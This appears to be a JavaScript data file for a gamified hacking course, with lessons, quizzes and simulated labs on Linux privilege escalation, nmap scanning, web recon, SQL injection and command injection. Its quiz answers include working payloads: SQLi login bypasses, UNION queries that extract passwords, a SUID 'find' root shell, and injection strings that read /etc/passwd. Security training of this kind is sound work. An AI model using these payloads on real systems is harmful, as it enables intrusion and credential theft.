      {type:"type",q:"Show all running processes:",a:["ps aux","ps -ef"],why:"ps aux lists every process with details."},
      {type:"teach",text:"Run a command in the background with &. Example: nmap target & runs nmap while you keep working. jobs lists background tasks. fg brings one back to the foreground."},
      {type:"type",q:"Run nmap in the background:",a:["nmap target &","nmap 10.10.10.5 &"],why:"& at the end runs the command in the background."},
    ]},
    {id:"u4cp",title:"\uD83C\uDFC6 Pipes Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"List files and filter for 'conf':",a:["ls | grep conf"],why:"Pipe ls output to grep for filtering."},
      {type:"type",q:"Save scan results to output.txt:",a:["nmap target > output.txt","nmap 10.10.10.5 > output.txt"],why:"> redirects output to a file."},
      {type:"build",q:"Build: find unique IPs from a log:",parts:["cat access.log","|","grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'","|","sort","|","uniq"],answer:["cat access.log","|","grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'","|","sort","|","uniq"],why:"Extract IPs, sort, deduplicate."},
      {type:"type",q:"Kill process with PID 1234:",a:["kill 1234","kill -9 1234"],why:"kill sends a termination signal to the process."},
    ]},
  ]},

  // ---- UNIT 5: LINUX FILESYSTEM ----
  {id:"u5",title:"Linux Deep Dive",desc:"Permissions, users, and the filesystem hackers exploit",levels:[
    {id:"u5l1",title:"File Permissions",rounds:[
      {type:"teach",text:"Every file has a bouncer. It checks 3 things: can you Read it (4 points), Write to it (2 points), or Run it (1 point)? And checks 3 groups: Owner, Group, Everyone Else. Add the points: 7 = full access, 5 = read+run, 4 = read only."},
      {type:"teach",text:"When you run ls -la, you see -rwxr-xr-- \u2014 this means: owner = rwx (read+write+execute = 7), group = r-x (read+execute = 5), others = r-- (read only = 4). So this is 754."},
      {type:"pick",q:"chmod 755 means:",opts:["Owner: full, Group: read+run, Others: read+run","Everyone: full access","Owner only, no one else","Read only for all"],a:"Owner: full, Group: read+run, Others: read+run",why:"7=rwx, 5=r-x, 5=r-x."},
      {type:"type",q:"Give a file full permissions for everyone:",a:["chmod 777 file","chmod 777 file.sh"],why:"777 = rwx for owner, group, and others. Rarely a good idea in practice."},
    ]},
    {id:"u5l2",title:"SUID \u2014 The Master Key",rounds:[
      {type:"teach",text:"SUID is like finding a master key lying on the ground. Normally programs run with YOUR permissions. But SUID programs run as the OWNER \u2014 usually root (the king). If you trick a root-owned SUID program, you become king."},
      {type:"type",q:"Find all SUID files on the system:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null","find / -perm -u=s"],why:"SUID binaries are goldmines for privilege escalation."},
      {type:"teach",text:"Check GTFOBins.github.io \u2014 it lists how to exploit hundreds of Linux programs when they have SUID. If find has SUID: find . -exec /bin/sh \\; drops you into a root shell."},
      {type:"tf",q:"A SUID program always runs with root privileges.",a:false,why:"SUID runs as the FILE OWNER. That's usually root, but not always."},
    ]},
    {id:"u5l3",title:"Important Files",rounds:[
      {type:"teach",text:"/etc/passwd = the guest list (who has accounts). /etc/shadow = the safe with password hashes (only root can read). /etc/group = team rosters. These are the first files hackers check after breaking in."},
      {type:"type",q:"View the list of users on the system:",a:["cat /etc/passwd"],why:"/etc/passwd stores username, UID, home directory, and default shell for each user."},
      {type:"teach",text:"Key directories for hackers: /tmp (world-writable \u2014 drop your tools here), /var/log (logs that track your activity), /var/www (web files), /root (root's home), ~/.bash_history (command history)."},
      {type:"match",q:"Match the path to its purpose:",pairs:[["/etc/shadow","Password hashes"],["/tmp","World-writable temp"],["/var/log","System logs"],["~/.bash_history","Command history"]],why:"Knowing where things are is essential for post-exploitation."},
    ]},
    {id:"u5l4",title:"Users & Sudo",rounds:[
      {type:"teach",text:"sudo = run a command as root (the king). sudo su switches to root permanently. whoami shows who you are. id shows your user ID and groups. Users in the sudo or wheel group have sudo access."},
      {type:"type",q:"Check who you're logged in as:",a:["whoami","id"],why:"whoami shows your username. id shows UID and group memberships."},
      {type:"type",q:"Switch to root user:",a:["sudo su","sudo -i","sudo bash"],why:"sudo su gives you a root shell."},
      {type:"teach",text:"sudo -l shows what commands you can run as root. This is the FIRST thing you check after getting access. If it says you can run /bin/bash as root \u2014 game over, instant root."},
      {type:"type",q:"Check your sudo privileges:",a:["sudo -l","sudo -ll"],why:"sudo -l lists what you can run as root. This is your first privesc check."},
    ]},
    {id:"u5cp",title:"\uD83C\uDFC6 Linux Checkpoint",isCheckpoint:true,rounds:[
      {type:"pick",q:"chmod 644 means:",opts:["Owner read+write, others read only","Full access for all","No access","Owner only"],a:"Owner read+write, others read only",why:"6=rw-, 4=r--, 4=r--."},
      {type:"type",q:"Find SUID binaries:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null"],why:"SUID files run as their owner \u2014 key for privilege escalation."},
      {type:"type",q:"View password hashes (as root):",a:["cat /etc/shadow","sudo cat /etc/shadow"],why:"/etc/shadow contains hashed passwords, readable only by root."},
      {type:"type",q:"Check what you can run as root:",a:["sudo -l"],why:"sudo -l is your first privilege escalation check."},
      {type:"match",q:"Match:",pairs:[["/etc/passwd","User accounts"],["/etc/shadow","Password hashes"],["/tmp","Drop tools here"],["/var/log","Activity logs"]],why:"Know your Linux filesystem."},
    ]},
  ]},

  // ---- UNIT 6: NETWORKING ----
  {id:"u6",title:"Networking",desc:"How computers talk \u2014 IPs, ports, and protocols",levels:[
    {id:"u6l1",title:"IP Addresses & Ports",rounds:[
      {type:"teach",text:"Computer = apartment building. IP address = street address. Ports (0-65535) = apartment numbers. Each apartment runs a different service. Apartment 80 = website, 22 = remote access (SSH), 443 = secure website, 445 = file sharing."},
      {type:"teach",text:"Key ports to memorize: 21=FTP (file transfer), 22=SSH (remote shell), 80=HTTP (website), 443=HTTPS (secure website), 445=SMB (Windows file sharing), 3306=MySQL (database), 3389=RDP (Windows remote desktop)."},
      {type:"match",q:"Match port to service:",pairs:[["22","SSH"],["80","HTTP"],["443","HTTPS"],["3389","RDP"]],why:"You'll see these ports in every scan."},
      {type:"pick",q:"A web server usually listens on port:",opts:["80","22","445","3389"],a:"80",why:"HTTP runs on port 80 (HTTPS on 443)."},
    ]},
    {id:"u6l2",title:"TCP vs UDP",rounds:[
      {type:"teach",text:"TCP = a phone call. You ring (SYN), they answer (SYN-ACK), you confirm (ACK) \u2014 then you talk. Everything is guaranteed to arrive in order. UDP = shouting across a room. Faster, but no guarantee they heard you."},
      {type:"pick",q:"TCP's 3-way handshake is:",opts:["SYN \u2192 SYN-ACK \u2192 ACK","ACK \u2192 SYN \u2192 FIN","HELLO \u2192 OK \u2192 START","PING \u2192 PONG \u2192 GO"],a:"SYN \u2192 SYN-ACK \u2192 ACK",why:"This handshake establishes a reliable connection."},
      {type:"tf",q:"UDP guarantees that data arrives in order.",a:false,why:"UDP is connectionless \u2014 fire and forget. No ordering, no delivery guarantee."},
    ]},
    {id:"u6l3",title:"Your Network Info",rounds:[
      {type:"teach",text:"ifconfig or ip addr shows your IP address. You MUST know your own IP when pentesting \u2014 you need it for reverse shells, listeners, and tunnels. On newer Linux, use ip addr. On older, ifconfig."},
      {type:"type",q:"Show your IP address:",a:["ip addr","ifconfig","ip a"],why:"Knowing your own IP is critical for setting up listeners and reverse shells."},
      {type:"teach",text:"ping tests if a host is alive. ss -tlnp shows all listening ports on YOUR machine. curl and wget download files from web servers \u2014 essential for grabbing tools and testing websites."},
      {type:"type",q:"Check if 10.10.10.5 is alive:",a:["ping 10.10.10.5","ping -c 4 10.10.10.5"],why:"ping sends packets and waits for a response."},
    ]},
    {id:"u6l4",title:"Subnets",rounds:[
      {type:"teach",text:"Subnetting = splitting a neighborhood into blocks. 192.168.1.0/24 means this block has 256 addresses (254 usable). The /24 is the block size: /24 = 256 houses, /25 = 128, /16 = 65,536 houses."},
      {type:"teach",text:"When a pentest scope says 10.10.10.0/24, that means you can scan 10.10.10.1 through 10.10.10.254. Scanning outside that range is illegal. /32 = a single host."},
      {type:"pick",q:"10.10.10.0/24 contains how many usable IPs?",opts:["254","256","255","1024"],a:"254",why:"/24 = 256 total addresses, minus network and broadcast = 254 usable."},
      {type:"tf",q:"Scanning IPs outside your scope is illegal.",a:true,why:"The scope defines your legal boundaries. Everything outside is off limits."},
    ]},
    {id:"u6cp",title:"\uD83C\uDFC6 Network Checkpoint",isCheckpoint:true,rounds:[
      {type:"match",q:"Match port to service:",pairs:[["21","FTP"],["22","SSH"],["80","HTTP"],["445","SMB"]],why:"Memorize these common ports."},
      {type:"pick",q:"TCP's 3-way handshake order:",opts:["SYN, SYN-ACK, ACK","ACK, SYN, FIN","UDP, TCP, ICMP","GET, POST, PUT"],a:"SYN, SYN-ACK, ACK",why:"SYN initiates, SYN-ACK acknowledges, ACK confirms."},
      {type:"type",q:"Show your IP address:",a:["ip addr","ifconfig","ip a"],why:"Know your own IP for reverse shells and listeners."},
      {type:"pick",q:"/24 subnet has how many usable IPs?",opts:["254","256","128","65534"],a:"254",why:"256 total minus network and broadcast addresses."},
    ]},
  ]},

  // LAB for Section 1
  {id:"u6lab",title:"\uD83D\uDDA5\uFE0F Lab: Find the Flag",desc:"Navigate a compromised server and find the hidden flag",levels:[
    {id:"s1lab",title:"Lab: Find the Flag",rounds:[
      {type:"lab",title:"Find the Flag",objective:"Navigate the filesystem of a compromised server and locate the hidden flag.",banner:"Connected to target 10.10.10.44...\n$ whoami\nwww-data\n",steps:[
        {hint:"First, check where you are on the system.",accept:["pwd"],output:"/var/www/html",successMsg:"You're in the web root directory.",example:"pwd",quickCmds:["pwd"]},
        {hint:"List all files including hidden ones.",accept:["ls -la","ls -al","~ls -la"],output:"-rw-r--r-- 1 root root  1245 Jan 15 index.html\n-rw-r--r-- 1 root root   340 Jan 15 style.css\ndrwxr-xr-x 2 root root  4096 Jan 15 uploads/\n-rw------- 1 root root    42 Jan 15 .secret_note",successMsg:"Found a hidden file: .secret_note!",example:"ls -la",quickCmds:["ls -la"]},
        {hint:"Read the hidden secret note.",accept:["cat .secret_note","~cat .secret"],output:"The real prize is in /opt/backup/ \u2014 look carefully.",successMsg:"A clue! The flag is in /opt/backup/",example:"cat .secret_note",quickCmds:["cat .secret_note"]},
        {hint:"Navigate to /opt/backup/ directory.",accept:["cd /opt/backup","~cd /opt/backup"],output:"",successMsg:"Moved to /opt/backup/",example:"cd /opt/backup",quickCmds:["cd /opt/backup"]},
        {hint:"Search for the flag file.",accept:["ls -la","~ls","~find","find . -name 'flag*'"],output:"drwxr-xr-x 2 root root 4096 Jan 15 .\ndrwxr-xr-x 3 root root 4096 Jan 15 ..\n-rw-r--r-- 1 root root  340 Jan 15 config.bak\n-rw-r--r-- 1 root root   32 Jan 15 .flag.txt",successMsg:"Found the hidden flag file!",example:"ls -la",quickCmds:["ls -la"]},
        {hint:"Read the flag!",accept:["cat .flag.txt","~cat .flag"],output:"FLAG{y0u_f0und_th3_h1dd3n_fl4g}",successMsg:"FLAG CAPTURED! You used pwd, ls -la, cat, cd, and find to navigate a compromised server and locate a hidden flag.",example:"cat .flag.txt",quickCmds:["cat .flag.txt"]}
      ]}
    ]}
  ]},
]};

// ============================================================
// SECTION 2: RECON & SCANNING (Intermediate)
// ============================================================
var SEC2 = {
  id:"s2",title:"Reconnaissance & Scanning",tier:"intermediate",icon:"\uD83D\uDD0D",color:"var(--blue)",
  desc:"Find targets, map networks, and discover vulnerabilities",
  units:[
  // ---- UNIT 7: PASSIVE RECON ----
  {id:"u7",title:"Passive Recon",desc:"Gather intel without touching the target",levels:[
    {id:"u7l1",title:"OSINT Basics",rounds:[
      {type:"teach",text:"OSINT (Open Source Intelligence) = gathering info from public sources. Google, social media, job postings, public records. The target has no idea you're looking. This is always your first step."},
      {type:"teach",text:"Google dorking = using advanced search operators. site:target.com finds pages on that domain. filetype:pdf site:target.com finds PDF documents. intitle:admin site:target.com finds admin pages. These are incredibly powerful."},
      {type:"type",q:"Find all PDFs on target.com using Google:",a:["site:target.com filetype:pdf","filetype:pdf site:target.com"],why:"Google dorking reveals documents, login pages, and sensitive files."},
      {type:"pick",q:"OSINT gathering is:",opts:["Legal \u2014 it's public info","Illegal without permission","Only for government use","Requires special tools"],a:"Legal \u2014 it's public info",why:"OSINT uses publicly available information. It's passive recon."},
    ]},
    {id:"u7l2",title:"WHOIS & DNS",rounds:[
      {type:"teach",text:"WHOIS tells you who registered a domain \u2014 names, emails, phone numbers, hosting company. whois target.com in your terminal. Sometimes this reveals admin contacts you can use for social engineering."},
      {type:"type",q:"Look up who owns target.com:",a:["whois target.com"],why:"WHOIS reveals domain registration details."},
      {type:"teach",text:"DNS (Domain Name System) translates names to IP addresses. dig target.com shows DNS records. nslookup target.com does the same thing. A records = IP addresses. MX records = mail servers. TXT records sometimes contain secrets."},
      {type:"type",q:"Look up DNS records for target.com:",a:["dig target.com","nslookup target.com","host target.com"],why:"DNS records reveal IPs, mail servers, and sometimes internal info."},
    ]},
    {id:"u7l3",title:"Subdomain Discovery",rounds:[
      {type:"teach",text:"Big companies have hundreds of subdomains: dev.target.com, staging.target.com, api.target.com. These side doors are often less secure than the main site. subfinder and amass find them automatically."},
      {type:"type",q:"Find subdomains of target.com:",a:["subfinder -d target.com","amass enum -d target.com"],why:"Subdomains reveal hidden services, dev environments, and forgotten apps."},
      {type:"tf",q:"Subdomain enumeration is considered passive recon.",a:true,why:"subfinder queries public databases and DNS records, never touching the target directly."},
    ]},
    {id:"u7cp",title:"\uD83C\uDFC6 Recon Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Find PDFs on a target site via Google:",a:["site:target.com filetype:pdf","filetype:pdf site:target.com"],why:"Google dorking finds exposed documents."},
      {type:"type",q:"Look up domain registration info:",a:["whois target.com"],why:"WHOIS reveals who owns the domain."},
      {type:"type",q:"Find subdomains:",a:["subfinder -d target.com","amass enum -d target.com"],why:"Subdomains are often less secured than the main site."},
      {type:"pick",q:"Which DNS record type maps a domain to an IP?",opts:["A record","MX record","TXT record","CNAME record"],a:"A record",why:"A records map domain names to IPv4 addresses."},
    ]},
  ]},

  // ---- UNIT 8: NMAP ----
  {id:"u8",title:"Nmap Scanning",desc:"The #1 scanning tool \u2014 find open ports and services",levels:[
    {id:"u8l1",title:"Nmap Basics",rounds:[
      {type:"teach",text:"Nmap is your radar. It finds which computers are alive, what doors (ports) are open, and what's behind each door. It's the single most important scanning tool you'll ever use."},
      {type:"type",q:"Scan the top 1000 ports on a target:",a:["nmap 10.10.10.5","nmap target.com"],why:"Basic nmap scans the 1000 most common ports."},
      {type:"type",q:"Scan ALL 65535 ports:",a:["nmap -p- 10.10.10.5","nmap -p- target.com"],why:"-p- means scan every port. Slower but catches services on unusual ports."},
      {type:"type",q:"Scan specific ports 22, 80, and 443:",a:["nmap -p 22,80,443 10.10.10.5","nmap -p 22,80,443 target"],why:"-p lets you specify exact ports to scan."},
    ]},
    {id:"u8l2",title:"Service Detection",rounds:[
      {type:"teach",text:"-sV makes nmap identify what SOFTWARE is running on each port. Instead of just 'port 80 open', you get 'Apache 2.4.41'. This is critical because you need the exact version to find exploits."},
      {type:"type",q:"Scan with service version detection:",a:["nmap -sV 10.10.10.5","nmap -sV target"],why:"-sV identifies software and version on each open port."},
      {type:"teach",text:"-O tries to identify the operating system. Combine everything: nmap -sV -O -p- target gives you a complete picture of the target."},
      {type:"build",q:"Build a comprehensive nmap scan:",parts:["nmap","-sV","-O","-p-","10.10.10.5"],answer:["nmap","-sV","-O","-p-","10.10.10.5"],why:"This scans all ports, detects services, and guesses the OS."},
    ]},
    {id:"u8l3",title:"Scan Types & Stealth",rounds:[
      {type:"teach",text:"Scan types: -sS (SYN scan) = knock and run away before they open \u2014 stealthy, default with root. -sT (TCP connect) = knock, shake hands, have a conversation \u2014 louder. -sU = check UDP doors. -sn = just check which houses have lights on."},
      {type:"pick",q:"Which scan type is stealthiest?",opts:["-sS (SYN)","-sT (TCP connect)","-sU (UDP)","-sn (ping)"],a:"-sS (SYN)",why:"SYN scan sends a SYN but never completes the handshake, making it harder to detect."},
      {type:"teach",text:"Speed: -T0 = paranoid (super slow), -T3 = normal, -T5 = insane (fast but loud). For real pentests use -T3 or -T4. For CTFs you can use -T5. IDS evasion: -f fragments packets."},
      {type:"type",q:"Fast SYN scan of all ports:",a:["nmap -sS -T4 -p- 10.10.10.5","nmap -sS -p- -T4 target"],why:"-sS for stealth, -T4 for speed, -p- for all ports."},
    ]},
    {id:"u8l4",title:"Nmap Scripts",rounds:[
      {type:"teach",text:"Nmap has hundreds of built-in scripts (NSE). --script=vuln runs vulnerability checks. --script=default runs safe default scripts. You can even target specific services like --script=http-enum for web directories."},
      {type:"type",q:"Run vulnerability scripts against a target:",a:["nmap --script=vuln 10.10.10.5","nmap --script vuln target"],why:"NSE scripts automate vulnerability detection."},
      {type:"type",q:"Run default safe scripts with service detection:",a:["nmap -sV -sC 10.10.10.5","nmap -sC -sV target"],why:"-sC runs default scripts. Same as --script=default."},
    ]},
    {id:"u8cp",title:"\uD83C\uDFC6 Nmap Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Scan all ports with version detection:",a:["nmap -sV -p- 10.10.10.5","nmap -p- -sV target"],why:"Complete port and service enumeration."},
      {type:"pick",q:"Which flag detects service versions?",opts:["-sV","-sS","-O","-p-"],a:"-sV",why:"-sV probes ports to determine software and version."},
      {type:"type",q:"Run vuln scripts on target:",a:["nmap --script=vuln 10.10.10.5","nmap --script vuln target"],why:"NSE vuln scripts check for known vulnerabilities."},
      {type:"pick",q:"Stealthiest scan type?",opts:["-sS","-sT","-sU","-sA"],a:"-sS",why:"SYN scan never completes the TCP handshake."},
    ]},
  ]},

  // ---- UNIT 9: WEB RECON ----
  {id:"u9",title:"Web Recon",desc:"Map web applications before attacking them",levels:[
    {id:"u9l1",title:"HTTP Methods",rounds:[
      {type:"teach",text:"HTTP is how browsers talk to web servers. GET = request a page. POST = send data (login forms, uploads). PUT = update something. DELETE = remove something. HEAD = just get headers, no content. Hackers test all methods."},
      {type:"match",q:"Match HTTP method to action:",pairs:[["GET","Request data"],["POST","Send data"],["PUT","Update resource"],["DELETE","Remove resource"]],why:"Understanding HTTP methods is fundamental to web hacking."},
      {type:"teach",text:"Status codes: 200 = OK, 301 = redirect, 403 = forbidden (exists but blocked!), 404 = not found, 500 = server error. 403 is exciting \u2014 it means something IS there, you just need to find a way in."},
      {type:"pick",q:"A 403 response means:",opts:["The page exists but access is denied","The page doesn't exist","The server crashed","You need to login"],a:"The page exists but access is denied",why:"403 Forbidden confirms the resource exists, which is useful intel."},
    ]},
    {id:"u9l2",title:"Directory Busting",rounds:[
      {type:"teach",text:"Directory busting = trying thousands of common paths to find hidden pages. /admin, /backup, /config, /.env, /robots.txt. Tools: gobuster, dirsearch, feroxbuster. They try paths from a wordlist automatically."},
      {type:"type",q:"Scan for hidden directories on a target:",a:["gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt","dirsearch -u http://target.com","feroxbuster -u http://target.com"],why:"Directory busting reveals admin panels, backup files, and config pages."},
      {type:"teach",text:"Always check robots.txt first \u2014 it tells search engines what NOT to index, which is basically a list of interesting paths. Also check .git/ for exposed source code, and .env for environment variables with passwords."},
      {type:"type",q:"Check the robots.txt file:",a:["curl http://target.com/robots.txt","curl target.com/robots.txt"],why:"robots.txt often reveals hidden directories the admin doesn't want public."},
    ]},
    {id:"u9l3",title:"Burp Suite Basics",rounds:[
      {type:"teach",text:"Burp Suite is your x-ray machine for websites. It sits between your browser and the website, letting you see and change EVERY request. Proxy = intercept and pause. Repeater = modify and resend. Intruder = try thousands of values."},
      {type:"teach",text:"Setup: Burp listens on 127.0.0.1:8080. Configure your browser to use that proxy. Now every request goes through Burp and you can see it, edit it, and resend it. Intercept mode lets you pause requests mid-flight."},
      {type:"pick",q:"Burp's Repeater is for:",opts:["Modifying and resending requests","Scanning for vulnerabilities","Brute-forcing passwords","Encoding text"],a:"Modifying and resending requests",why:"Repeater lets you tweak and replay HTTP requests to test different inputs."},
      {type:"match",q:"Match Burp tool to function:",pairs:[["Proxy","Intercept requests"],["Repeater","Modify and resend"],["Intruder","Automated attacks"],["Decoder","Encode/decode text"]],why:"Each Burp module serves a different purpose."},
    ]},
    {id:"u9cp",title:"\uD83C\uDFC6 Web Recon Checkpoint",isCheckpoint:true,rounds:[
      {type:"pick",q:"HTTP 403 means:",opts:["Forbidden (but exists)","Not found","Server error","Redirect"],a:"Forbidden (but exists)",why:"403 = the resource exists but you're not allowed to access it."},
      {type:"type",q:"Scan for hidden directories:",a:["gobuster dir -u http://target.com -w /usr/share/wordlists/common.txt","dirsearch -u http://target.com"],why:"Directory busting finds hidden pages and admin panels."},
      {type:"type",q:"Check robots.txt:",a:["curl http://target.com/robots.txt","curl target.com/robots.txt"],why:"robots.txt reveals paths the admin tried to hide from search engines."},
      {type:"match",q:"Match Burp tool:",pairs:[["Proxy","Intercept"],["Repeater","Modify/resend"],["Intruder","Automate"]],why:"Know your Burp Suite tools."},
    ]},
  ]},

  // LAB
  {id:"u9lab",title:"\uD83D\uDDA5\uFE0F Lab: Scan the Bank",desc:"Perform recon and scanning on a simulated bank server",levels:[
    {id:"s2lab",title:"Lab: Scan the Bank",rounds:[
      {type:"lab",title:"Scan the Bank",objective:"Enumerate SecureBank Corp's server at 10.10.10.88 and find vulnerabilities.",banner:"Target: SecureBank Corp \u2014 10.10.10.88\nScope: Full port scan + web enum authorized\n",steps:[
        {hint:"First, check if the target is alive.",accept:["ping 10.10.10.88","~ping"],output:"PING 10.10.10.88: 64 bytes from 10.10.10.88: icmp_seq=1 ttl=63 time=24.3ms\n--- 4 packets transmitted, 4 received, 0% loss ---",successMsg:"Target is alive! Let's scan it.",example:"ping 10.10.10.88",quickCmds:["ping 10.10.10.88"]},
        {hint:"Run a full port scan with service detection.",accept:["~nmap -sV","~nmap -p-","nmap -sV -p- 10.10.10.88"],output:"PORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1\n80/tcp   open  http       Apache 2.4.29\n3306/tcp open  mysql      MySQL 5.7.32\n8080/tcp open  http-proxy Squid 3.5.27",successMsg:"Found 4 open ports! SSH, HTTP, MySQL, and a proxy.",example:"nmap -sV -p- 10.10.10.88",quickCmds:["nmap -sV -p- 10.10.10.88"]},
        {hint:"Run vulnerability scripts on the web server (port 80).",accept:["~nmap --script","~nmap --script=vuln","nmap --script=vuln -p 80 10.10.10.88"],output:"| http-sql-injection: Possible SQL injection in /login.php?user=\n| http-enum: /admin/ - Admin panel\n|            /backup/ - Backup directory\n|            /phpmyadmin/ - phpMyAdmin",successMsg:"Found SQL injection, admin panel, and phpMyAdmin!",example:"nmap --script=vuln -p 80 10.10.10.88",quickCmds:["nmap --script=vuln -p 80 10.10.10.88"]},
        {hint:"Check robots.txt for hidden paths.",accept:["~curl","curl http://10.10.10.88/robots.txt"],output:"User-agent: *\nDisallow: /admin/\nDisallow: /backup/db_dump.sql\nDisallow: /internal/",successMsg:"Found a database dump file! /backup/db_dump.sql",example:"curl http://10.10.10.88/robots.txt",quickCmds:["curl http://10.10.10.88/robots.txt"]},
        {hint:"Download the exposed database dump.",accept:["~curl","~wget","curl http://10.10.10.88/backup/db_dump.sql","wget http://10.10.10.88/backup/db_dump.sql"],output:"-- MySQL dump\n-- Table: users\nINSERT INTO users VALUES (1,'admin','5f4dcc3b5aa765d61d8327deb882cf99',1);\nINSERT INTO users VALUES (2,'jsmith','e99a18c428cb38d5f260853678922e03',0);\n-- admin hash = 'password', jsmith hash = 'abc123'",successMsg:"Database dump with password hashes! admin:password, jsmith:abc123. Critical finding \u2014 report it!",example:"curl http://10.10.10.88/backup/db_dump.sql",quickCmds:["curl http://10.10.10.88/backup/db_dump.sql"]}
      ]}
    ]}
  ]},
]};

// ============================================================
// SECTION 3: EXPLOITATION (Intermediate)
// ============================================================
var SEC3 = {
  id:"s3",title:"Exploitation",tier:"intermediate",icon:"\u26A1",color:"var(--red)",
  desc:"Break in: SQL injection, XSS, password cracking, and Metasploit",
  units:[
  {id:"u10",title:"SQL Injection",desc:"Trick databases into giving up their secrets",levels:[
    {id:"u10l1",title:"How SQLi Works",rounds:[
      {type:"teach",text:"The login page asks for your name and plugs it directly into a database command. If you say your name is admin'-- the command becomes: find user admin and IGNORE the password check. The -- means forget everything after this."},
      {type:"teach",text:"It's like a robot guard that follows instructions too literally. Normal: Is your name Bob and password 1234? SQLi: Is your name admin -- (guard stops listening, lets you in)."},
      {type:"pick",q:"What does -- do in SQL?",opts:["Comments out the rest of the line","Deletes the database","Encrypts the query","Runs another command"],a:"Comments out the rest of the line",why:"-- makes SQL ignore everything after it, including password checks."},
      {type:"type",q:"Basic SQLi login bypass:",a:["admin'--","' OR 1=1--","admin' OR 1=1--"],why:"The ' breaks the string, -- comments out the password check."},
    ]},
    {id:"u10l2",title:"Testing for SQLi",rounds:[
      {type:"teach",text:"Step 1: Add a single quote ' to any input. If you get a database error, it's probably vulnerable. Step 2: Try ' OR 1=1-- (returns all rows). Step 3: Use UNION SELECT to pull data from other tables."},
      {type:"type",q:"First test for SQL injection:",a:["'","' OR 1=1--"],why:"A single quote breaks SQL syntax. If the site shows an error, it's likely vulnerable."},
      {type:"teach",text:"sqlmap automates the entire SQLi process. Point it at a URL with a parameter and it tests every injection type, extracts databases, tables, and dumps all the data."},
      {type:"type",q:"Automate SQLi with sqlmap:",a:["sqlmap -u 'http://target/page?id=1' --dbs","sqlmap -u http://target/page?id=1 --dbs"],why:"sqlmap finds and exploits injection points automatically."},
    ]},
    {id:"u10l3",title:"Advanced SQLi",rounds:[
      {type:"teach",text:"UNION injection: combines your query with the original. ' UNION SELECT username,password FROM users-- pulls usernames and passwords. First find the right number of columns with ORDER BY."},
      {type:"type",q:"Extract user data with UNION:",a:["' UNION SELECT username,password FROM users--","' UNION SELECT 1,2,3--"],why:"UNION combines results from two queries into one output."},
      {type:"tf",q:"sqlmap can only find basic SQL injection.",a:false,why:"sqlmap handles blind, time-based, UNION, stacked queries, and many other SQLi types."},
    ]},
    {id:"u10cp",title:"\uD83C\uDFC6 SQLi Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Test if a field is vulnerable to SQLi:",a:["'","' OR 1=1--"],why:"A single quote tests for SQL injection."},
      {type:"type",q:"Bypass a login with SQLi:",a:["admin'--","' OR 1=1--"],why:"Break the query and comment out the password check."},
      {type:"type",q:"Automate SQL injection:",a:["sqlmap -u 'http://target/page?id=1' --dbs","sqlmap -u http://target/page?id=1"],why:"sqlmap automates SQLi testing and data extraction."},
      {type:"pick",q:"-- in SQL injection is used to:",opts:["Comment out the rest of the query","Encrypt data","Create a table","Delete records"],a:"Comment out the rest of the query",why:"-- comments out the password check, bypassing authentication."},
    ]},
  ]},

  {id:"u11",title:"XSS & Web Attacks",desc:"Inject code into websites and steal sessions",levels:[
    {id:"u11l1",title:"Cross-Site Scripting",rounds:[
      {type:"teach",text:"XSS = planting a booby trap on a website. You hide code in a comment or post. When someone else views the page, the trap springs in THEIR browser \u2014 it can steal their login cookie."},
      {type:"teach",text:"3 types: Stored XSS (your trap stays in the database forever \u2014 most dangerous). Reflected XSS (only works through a special trick link). DOM-based (the browser's JavaScript processes your input unsafely)."},
      {type:"pick",q:"Which XSS type is most dangerous?",opts:["Stored","Reflected","DOM-based","All equal"],a:"Stored",why:"Stored XSS persists in the database and affects every user who views the page."},
      {type:"tf",q:"XSS only works if the victim clicks a link.",a:false,why:"Stored XSS triggers automatically when any user views the infected page."},
    ]},
    {id:"u11l2",title:"Command Injection & SSRF",rounds:[
      {type:"teach",text:"Command injection: if a website passes your input to a system command, you can chain extra commands with ; or |. Input: 127.0.0.1; cat /etc/passwd runs ping AND reads the password file."},
      {type:"type",q:"Inject a command to read /etc/passwd:",a:["127.0.0.1; cat /etc/passwd","| cat /etc/passwd","; cat /etc/passwd"],why:"; separates commands. The server runs both: your injected command executes."},
      {type:"teach",text:"SSRF = tricking the server into fetching things for you. Like convincing a waiter to go into the VIP room and bring stuff back. You tell the server to visit internal pages only IT can access."},
      {type:"pick",q:"SSRF stands for:",opts:["Server-Side Request Forgery","Secure Socket Relay Framework","Session State Request Failure","Server Script Remote Function"],a:"Server-Side Request Forgery",why:"You forge requests that the server makes on your behalf to internal resources."},
    ]},
    {id:"u11cp",title:"\uD83C\uDFC6 Web Attacks Checkpoint",isCheckpoint:true,rounds:[
      {type:"pick",q:"Stored XSS is dangerous because:",opts:["It affects all users who view the page","It only works once","It requires a special link","It crashes the server"],a:"It affects all users who view the page",why:"Stored XSS persists and triggers for everyone."},
      {type:"type",q:"Inject a command alongside a ping:",a:["127.0.0.1; cat /etc/passwd","| cat /etc/passwd"],why:"; chains commands together on the server."},
      {type:"pick",q:"SSRF lets you:",opts:["Make the server fetch internal resources","Crash the database","Encrypt traffic","Scan ports"],a:"Make the server fetch internal resources",why:"SSRF tricks the server into making requests to internal systems you can't reach directly."},
    ]},
  ]},

  {id:"u12",title:"Password Cracking",desc:"Break hashes and brute-force logins",levels:[
    {id:"u12l1",title:"How Hashes Work",rounds:[
      {type:"teach",text:"Passwords aren't stored as plain text \u2014 they're scrambled into hashes (like putting a word through a meat grinder). You can't un-grind it. But you CAN grind every word in a dictionary and compare the results."},
      {type:"teach",text:"Common hash types: MD5 = 32 characters (weak, fast to crack). SHA-256 = 64 characters. bcrypt starts with $2b$ (slow, hard to crack). NTLM = Windows passwords."},
      {type:"pick",q:"Why can't you reverse a hash?",opts:["Hashing is a one-way function","The password is deleted","It's encrypted with a key","The algorithm is secret"],a:"Hashing is a one-way function",why:"Hashing destroys information. You can only compare hashes, never reverse them."},
    ]},
    {id:"u12l2",title:"Cracking Tools",rounds:[
